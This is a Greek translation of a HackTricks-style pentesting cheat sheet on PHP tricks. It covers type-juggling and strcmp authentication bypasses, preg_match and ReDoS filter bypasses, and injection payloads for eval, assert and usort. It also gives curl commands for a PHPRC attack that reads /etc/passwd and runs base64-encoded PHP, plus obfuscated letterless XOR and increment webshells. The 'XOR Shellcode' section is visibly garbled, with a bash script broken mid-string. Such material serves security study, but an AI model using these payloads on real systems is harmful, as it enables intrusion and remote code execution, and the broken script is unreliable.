# Κόλπα στο PHP

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα κόλπα σας στο χάκινγκ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Συνηθισμένη τοποθεσία Cookies:

Αυτό ισχύει επίσης για τα cookies του phpMyAdmin.
```
PHPSESSID
phpMyAdmin
```
Τοποθεσίες:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Παράκαμψη συγκρίσεων PHP

### Χαλαρές συγκρίσεις/Τύπος Juggling ( == )

Εάν χρησιμοποιείται το `==` στην PHP, τότε υπάρχουν απροσδόκητες περιπτώσεις όπου η σύγκριση δεν συμπεριφέρεται όπως αναμενόταν. Αυτό συμβαίνει επειδή το "==" συγκρίνει μόνο τιμές μετασχηματισμένες στον ίδιο τύπο, εάν θέλετε επίσης να συγκρίνετε τον τύπο των δεδομένων που συγκρίνονται, πρέπει να χρησιμοποιήσετε το `===`.

Πίνακες σύγκρισης PHP: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (567).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` Ένα string που δεν ξεκινά με έναν αριθμό είναι ίσο με έναν αριθμό
* `"0xAAAA" == "43690" -> True` Strings που αποτελούνται από αριθμούς σε δεκαδική ή εξαδική μορφή μπορούν να συγκριθούν με άλλους αριθμούς/strings με αποτέλεσμα True εάν οι αριθμοί ήταν ίδιοι (οι αριθμοί σε ένα string ερμηνεύονται ως αριθμοί)
* `"0e3264578" == 0 --> True` Ένα string που ξεκινά με "0e" και ακολουθείται από οτιδήποτε θα είναι ίσο με 0
* `"0X3264578" == 0X --> True` Ένα string που ξεκινά με "0" και ακολουθείται από οποιοδήποτε γράμμα (το X μπορεί να είναι οποιοσδήποτε χαρακτήρας) και ακολουθείται από οτιδήποτε θα είναι ίσο με 0
* `"0e12334" == "0" --> True` Αυτό είναι πολύ ενδιαφέρον επειδή σε ορισμένες περιπτώσεις μπορείτε να ελέγξετε τη συμβολοσειρά εισόδου του "0" και κάποιο περιεχόμενο που υπολογίζεται και συγκρίνεται με αυτό. Επομένως, εάν μπορείτε να παρέχετε μια τιμή που θα δημιουργήσει ένα hash που ξεκινά με "0e" και χωρίς κανένα γράμμα, μπορείτε να παρακάμψετε τη σύγκριση. Μπορείτε να βρείτε **ήδη κατακερματισμένες συμβολοσειρές** με αυτήν τη μορφή εδώ: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Οποιοσδήποτε χαρακτήρας σε ένα string είναι ίσος με τον ακέραιο 0

Περισσότερες πληροφορίες στο [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

Ο **Τύπος Juggling** επηρεάζει επίσης τη λειτουργία της συνάρτησης `in_array()` από προεπιλογή (χρειάζεται να ορίσετε σε true το τρίτο όρισμα για να γίνει μια αυστηρή σύγκριση):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Εάν αυτή η συνάρτηση χρησιμοποιείται για **οποιονδήποτε έλεγχο ταυτότητας** (όπως έλεγχος κωδικού πρόσβασης) και ο χρήστης ελέγχει ένα μέρος της σύγκρισης, μπορεί να στείλει ένα κενό πίνακα αντί για συμβολοσειρά ως τιμή του κωδικού πρόσβασης (`https://example.com/login.php/?username=admin&password[]=`) και να παρακάμψει αυτόν τον έλεγχο:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
Η ίδια σφάλμα συμβαίνει και με το `strcasecmp()`

### Αυστηρή τύπου μαγεία

Ακόμα κι αν χρησιμοποιείται το `===` ενδέχεται να υπάρχουν σφάλματα που καθιστούν τη σύγκριση ευάλωτη στην τύπου μαγεία. Για παράδειγμα, αν η σύγκριση μετατρέπει τα δεδομένα σε διαφορετικό τύπο αντικειμένου πριν τη σύγκριση:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** μπορεί να χρησιμοποιηθεί για να **επικυρώσει την είσοδο του χρήστη** (ελέγχει αν κάποια **λέξη/regex** από μια **μαύρη λίστα** είναι **παρούσα** στην **είσοδο του χρήστη** και αν δεν είναι, ο κώδικας μπορεί να συνεχίσει την εκτέλεσή του).

#### Παράκαμψη νέας γραμμής

Ωστόσο, όταν περιορίζετε την αρχή του regexp`preg_match()` **ελέγχει μόνο την πρώτη γραμμή της εισόδου του χρήστη**, έτσι αν κάπως μπορείτε να **στείλετε** την είσοδο σε **πολλαπλές γραμμές**, θα μπορούσατε να παρακάμψετε αυτόν τον έλεγχο. Παράδειγμα:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Για να παρακάμψετε αυτόν τον έλεγχο μπορείτε να **στείλετε την τιμή με νέες γραμμές urlencoded** (`%0A`) ή αν μπορείτε να στείλετε **δεδομένα JSON**, στείλτε τα σε **πολλαπλές γραμμές**:
```php
{
"cmd": "cat /etc/passwd"
}
```
Βρείτε ένα παράδειγμα εδώ: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Παράκαμψη σφάλματος μήκους**

(Αυτή η παράκαμψη δοκιμάστηκε προφανώς σε PHP 5.2.5 και δεν μπόρεσα να την κάνω να λειτουργήσει σε PHP 7.3.15)\
Αν μπορείτε να στείλετε στο `preg_match()` ένα πολύ **μεγάλο έγκυρο είσοδο**, δεν θα μπορέσει να το επεξεργαστεί και θα μπορέσετε να **παρακάμψετε** τον έλεγχο. Για παράδειγμα, αν απαγορεύει ένα JSON μπορείτε να στείλετε:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
#### Παράκαμψη ReDoS

Κόλπο από: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) και [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Συνοπτικά, το πρόβλημα συμβαίνει επειδή οι συναρτήσεις `preg_*` στην PHP βασίζονται στην [βιβλιοθήκη PCRE](http://www.pcre.org/). Στο PCRE, ορισμένες κανονικές εκφράσεις ταιριάζονται χρησιμοποιώντας πολλές αναδρομικές κλήσεις, οι οποίες χρησιμοποιούν πολύ χώρο στο stack. Είναι δυνατόν να οριστεί ένα όριο στον αριθμό των αναδρομών που επιτρέπονται, αλλά στην PHP αυτό το όριο [προεπιλέγεται σε 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) που είναι περισσότερο από ό,τι χωράει στο stack.

[Αυτό το νήμα στο Stackoverflow](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) συνδέθηκε επίσης στην ανάρτηση όπου μιλάει πιο αναλυτικά για αυτό το θέμα. Η εργασία μας ήταν τώρα σαφής:\
**Στείλτε μια είσοδο που θα κάνει το regex να κάνει 100.000+ αναδρομές, προκαλώντας SIGSEGV, κάνοντας τη συνάρτηση `preg_match()` να επιστρέψει `false`, κάνοντας έτσι την εφαρμογή να νομίζει ότι η είσοδός μας δεν είναι κακόβουλη, ρίχνοντας την έκπληξη στο τέλος του φορτίου κάτι σαν `{system(<verybadcommand>)}` για να πάρουμε SSTI --> RCE --> σημαία :)**.

Καλά, σε όρους regex, δεν κάνουμε πραγματικά 100k "αναδρομές", αλλά αντίθετα μετράμε "βήματα επιστροφής", τα οποία όπως αναφέρει το [έγγραφο PHP](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) προεπιλέγονται σε 1.000.000 (1M) στη μεταβλητή `pcre.backtrack_limit`.\
Για να φτάσουμε εκεί, `'X'*500_001` θα οδηγήσει σε 1 εκατομμύριο βήματα επιστροφής (500k προς τα εμπρός και 500k προς τα πίσω):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Τύπος Κρούσης για Απόκρυψη στο PHP
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Εκτέλεση Μετά την Ανακατεύθυνση (EAR)

Εάν το PHP ανακατευθύνει σε μια άλλη σελίδα αλλά δεν καλείται η συνάρτηση **`die`** ή **`exit`** μετά τον ορισμό του κεφαλίδας `Location`, τότε το PHP συνεχίζει την εκτέλεση και προσθέτει τα δεδομένα στο σώμα:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Εκμετάλλευση Διάβασης Διαδρομής και Συμπερίληψης Αρχείων

Ελέγξτε:

{% content-ref url="../../../pentesting-web/file-inclusion/" %}
[file-inclusion](../../../pentesting-web/file-inclusion/)
{% endcontent-ref %}

## Περισσότερα κόλπα

* **register\_globals**: Στο **PHP < 4.1.1.1** ή αν δεν έχει ρυθμιστεί σωστά, το **register\_globals** μπορεί να είναι ενεργό (ή η συμπεριφορά του να μιμείται). Αυτό σημαίνει ότι σε γενικές μεταβλητές όπως το $\_GET αν έχουν μια τιμή π.χ. $\_GET\["param"]="1234", μπορείτε να την προσπελάσετε μέσω του **$param**. Έτσι, με την αποστολή παραμέτρων HTTP μπορείτε να **αντικαταστήσετε μεταβλητές** που χρησιμοποιούνται στον κώδικα.
* Τα **cookies PHPSESSION του ίδιου τομέα αποθηκεύονται στον ίδιο τόπο**, επομένως αν εντός ενός τομέα **χρησιμοποιούνται διαφορετικά cookies σε διαφορετικά μονοπάτια** μπορείτε να κάνετε ένα μονοπάτι **να έχει πρόσβαση στο cookie του μονοπατιού** ορίζοντας την τιμή του cookie του άλλου μονοπατιού.\
Με αυτόν τον τρόπο, αν **και τα δύο μονοπάτια έχουν πρόσβαση σε μια μεταβλητή με το ίδιο όνομα** μπορείτε να κάνετε τη **τιμή αυτής της μεταβλητής στο μονοπάτι1 να ισχύει για το μονοπάτι2**. Και στη συνέχεια το μονοπάτι2 θα θεωρήσει ως έγκυρες τις μεταβλητές του μονοπατιού1 (δίνοντας στο cookie το όνομα που του αντιστοιχεί στο μονοπάτι2).
* Όταν έχετε τα **ονόματα χρηστών** των χρηστών της μηχανής. Ελέγξτε τη διεύθυνση: **/\~\<USERNAME>** για να δείτε αν οι κατάλογοι php είναι ενεργοποιημένοι.
* [**LFI και RCE χρησιμοποιώντας php wrappers**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Αυτές οι λειτουργίες χρησιμοποιούνται τυπικά στο PHP για το **δημιουργία hashes από κωδικούς πρόσβασης** και για να **ελέγξουν** αν ένας κωδικός πρόσβασης είναι σωστός σε σύγκριση με ένα hash.\
Οι υποστηριζόμενοι αλγόριθμοι είναι: `PASSWORD_DEFAULT` και `PASSWORD_BCRYPT` (ξεκινά με `$2y$`). Σημειώστε ότι το **PASSWORD\_DEFAULT είναι συχνά το ίδιο με το PASSWORD\_BCRYPT.** Και επί του παρόντος, το **PASSWORD\_BCRYPT** έχει μια **περιορισμένη μέγεθος εισόδου στα 72bytes**. Επομένως, όταν προσπαθείτε να κάνετε hash κάτι μεγαλύτερο από 72bytes με αυτόν τον αλγόριθμο, θα χρησιμοποιηθούν μόνο τα πρώτα 72B:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### Παράκαμψη κεφαλίδων HTTP με κατάχρηση σφαλμάτων PHP

#### Προκαλώντας σφάλμα μετά την ρύθμιση των κεφαλίδων

Από [**αυτό το νήμα στο Twitter**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A\&s=19) μπορείτε να δείτε ότι αποστέλλοντας περισσότερα από 1000 παραμέτρους GET ή 1000 παραμέτρους POST ή 20 αρχεία, το PHP δεν θα ρυθμίσει τις κεφαλίδες στην απόκριση.

Επιτρέποντας την παράκαμψη για παράδειγμα των CSP κεφαλίδων που έχουν οριστεί σε κώδικες όπως:
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### Γέμισμα σώματος πριν την ρύθμιση των κεφαλίδων

Εάν μια **σελίδα PHP εκτυπώνει σφάλματα και αντανακλά κάποια είσοδο που παρέχεται από τον χρήστη**, ο χρήστης μπορεί να κάνει τον διακομιστή PHP να εκτυπώσει κάποιο **περιεχόμενο αρκετά μεγάλο** ώστε όταν προσπαθήσει να **προσθέσει τις κεφαλίδες** στην απόκριση, ο διακομιστής θα εκτοξεύσει ένα σφάλμα.\
Στο ακόλουθο σενάριο ο **επιτιθέμενος έκανε τον διακομιστή να εκτοξεύσει μερικά μεγάλα σφάλματα**, και όπως μπορείτε να δείτε στην οθόνη, όταν το PHP προσπάθησε να **τροποποιήσει τις πληροφορίες των κεφαλίδων, δεν μπόρεσε** (για παράδειγμα, η κεφαλίδα CSP δεν απεστάλη στον χρήστη):

![](<../../../.gitbook/assets/image (1085).png>)

## Εκτέλεση κώδικα

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Ελέγξτε αυτό για περισσότερες χρήσιμες συναρτήσεις PHP](php-useful-functions-disable\_functions-open\_basedir-bypass/) 

### **RCE μέσω** **preg\_replace()**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Για να εκτελεστεί ο κώδικας στο όρισμα "replace" απαιτείται τουλάχιστον ένα ταίριασμα.\
Αυτή η επιλογή της preg\_replace έχει **αποσυρθεί από την PHP 5.5.0.**

### **RCE μέσω Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE μέσω Assert()**

Αυτή η λειτουργία μέσα στην php σάς επιτρέπει να **εκτελέσετε κώδικα που έχει γραφτεί σε ένα string** προκειμένου να **επιστρέψει true ή false** (και ανάλογα με αυτό να αλλάξει την εκτέλεση). Συνήθως η μεταβλητή χρήστη θα εισαχθεί στη μέση ενός string. Για παράδειγμα:\
`assert("strpos($_GET['page']),'..') === false")` --> Σε αυτήν την περίπτωση για να πάρετε **RCE** μπορείτε να κάνετε:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Θα πρέπει να **διακόψετε** τη **σύνταξη** του κώδικα, **προσθέσετε** το **φορτίο** σας, και μετά να το **διορθώσετε ξανά**. Μπορείτε να χρησιμοποιήσετε **λογικές λειτουργίες** όπως "**and" ή "%26%26" ή "|"**. Σημειώστε ότι το "or", "||" δεν λειτουργεί επειδή αν η πρώτη συνθήκη είναι αληθής το φορτίο μας δεν θα εκτελεστεί. Με τον ίδιο τρόπο το ";" δεν λειτουργεί επειδή το φορτίο μας δεν θα εκτελεστεί.

**Άλλη επιλογή** είναι να προσθέσετε στο string την εκτέλεση της εντολής: `'.highlight_file('.passwd').'`

**Άλλη επιλογή** (αν έχετε τον εσωτερικό κώδικα) είναι να τροποποιήσετε κάποια μεταβλητή για να αλλοιώσετε την εκτέλεση: `$file = "hola"`

### **RCE μέσω usort()**

Αυτή η συνάρτηση χρησιμοποιείται για την ταξινόμηση ενός πίνακα αντικειμένων χρησιμοποιώντας μια συγκεκριμένη συνάρτηση.\
Για να καταχραστείτε αυτήν τη συνάρτηση:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
### **RCE μέσω .httaccess**

Αν μπορείς να **ανεβάσεις** ένα **.htaccess**, τότε μπορείς να **διαμορφώσεις** αρκετά πράγματα και ακόμα και να εκτελέσεις κώδικα (διαμορφώνοντας αρχεία με κατάληξη .htaccess ώστε να μπορούν να **εκτελεστούν**).

Διαφορετικά .htaccess shells μπορούν να βρεθούν [εδώ](https://github.com/wireghoul/htshells)

### RCE μέσω Μεταβλητών Περιβάλλοντος

Αν βρεις μια ευπάθεια που σου επιτρέπει να **τροποποιήσεις μεταβλητές περιβάλλοντος στο PHP** (και μια άλλη για να ανεβάσεις αρχεία, αν και με περισσότερη έρευνα ίσως αυτό να μπορεί να ανακληθεί), θα μπορούσες να εκμεταλλευτείς αυτή τη συμπεριφορά για να πάρεις **RCE**.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Αυτή η μεταβλητή περιβάλλοντος σου επιτρέπει να φορτώσεις τυχαίες βιβλιοθήκες κατά την εκτέλεση άλλων δυαδικών (αν και σε αυτήν την περίπτωση μπορεί να μη λειτουργήσει).
* **`PHPRC`** : Οδηγεί το PHP σχετικά με το **πού να εντοπίσει το αρχείο ρυθμίσεών του**, συνήθως ονομάζεται `php.ini`. Αν μπορείς να ανεβάσεις το δικό σου αρχείο ρυθμίσεων, τότε χρησιμοποίησε το `PHPRC` για να το κατευθύνεις το PHP σε αυτό. Πρόσθεσε μια **εγγραφή `auto_prepend_file`** που καθορίζει ένα δεύτερο ανεβασμένο αρχείο. Αυτό το δεύτερο αρχείο περιέχει κανονικό **κώδικα PHP, ο οποίος στη συνέχεια εκτελείται** από τον χρόνο εκτέλεσης PHP πριν από οποιονδήποτε άλλο κώδικα.
1. Ανέβασε ένα αρχείο PHP που περιέχει τον κώδικα του shell μας
2. Ανέβασε ένα δεύτερο αρχείο που περιέχει μια **οδηγία `auto_prepend_file`** που ενημερώνει τον προεπεξεργαστή PHP να εκτελέσει το αρχείο που ανεβάσαμε στο βήμα 1
3. Ορίστε τη μεταβλητή `PHPRC` στο αρχείο που ανεβάσαμε στο βήμα 2.
* Βρες περισσότερες πληροφορίες για το πώς να εκτελέσεις αυτή τη σειρά [**από την αρχική αναφορά**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
* **PHPRC** - μια άλλη επιλογή
* Αν **δεν μπορείς να ανεβάσεις αρχεία**, μπορείς να χρησιμοποιήσεις στο FreeBSD το "αρχείο" `/dev/fd/0` το οποίο περιέχει το **`stdin`**, είναι το **σώμα** του αιτήματος που στάλθηκε στο `stdin`:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Ή για να πάρεις RCE, ενεργοποίησε το **`allow_url_include`** και προσθέσε ένα αρχείο με **κώδικα PHP base64**:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* Τεχνική [**από αυτήν την αναφορά**](https://vulncheck.com/blog/juniper-cve-2023-36845).

## Στατική ανάλυση PHP

Δες αν μπορείς να εισάγεις κώδικα σε κλήσεις αυτών των συναρτήσεων (από [εδώ](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Αν αποσφαλματίζετε μια εφαρμογή PHP, μπορείτε να ενεργοποιήσετε γενικά την εκτύπωση σφαλμάτων στο `/etc/php5/apache2/php.ini` προσθέτοντας `display_errors = On` και επανεκκινήστε το apache: `sudo systemctl restart apache2`

### Αποκρυπτογράφηση κώδικα PHP

Μπορείτε να χρησιμοποιήσετε το **web**[ **www.unphp.net**](http://www.unphp.net) **για να αποκρυπτογραφήσετε κώδικα php.**

## Πρωτόκολλα & Πρωτόκολλα PHP

Τα πρωτόκολλα και τα πρωτόκολλα PHP μπορεί να σας επιτρέψουν να **παρακάμψετε τις προστασίες εγγραφής και ανάγνωσης** σε ένα σύστημα και να τον απειλήσετε. Για [**περισσότερες πληροφορίες ελέγξτε αυτή τη σελίδα**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug μη εξουσιοδοτημένο RCE

Αν δείτε ότι το **Xdebug** είναι **ενεργοποιημένο** σε έξοδο `phpconfig()`, πρέπει να προσπαθήσετε να λάβετε RCE μέσω [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Μεταβλητές μεταβλητές
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE κατάχρηση νέου $\_GET\["a"]\($\_GET\["b"])

Αν σε μια σελίδα μπορείς **να δημιουργήσεις ένα νέο αντικείμενο μιας τυχαίας κλάσης**, ενδέχεται να μπορείς να κερδίσεις RCE, ελέγξτε την ακόλουθη σελίδα για να μάθετε πώς:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Εκτέλεση PHP χωρίς γράμματα

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Χρησιμοποιώντας οκταδικό
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### XOR εύκολος κώδικας κέλυφους

Σύμφωνα με [**αυτή την ανάλυση**](https://mgp25.com/ctf/Web-challenge/), είναι δυνατόν να δημιουργηθεί ένας εύκολος κώδικας κέλυφους με αυτόν τον τρόπο:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Έτσι, αν μπορείτε **να εκτελέσετε αυθαίρετο PHP χωρίς αριθμούς και γράμματα** μπορείτε να στείλετε ένα αίτημα όπως το παρακάτω καταχρώμενοντας αυτό το φορτίο για να εκτελέσετε αυθαίρετο PHP:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Για μια πιο λεπτομερή εξήγηση ελέγξτε [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### XOR Shellcode (μέσα σε eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Παρόμοιο με την Perl
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**Την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
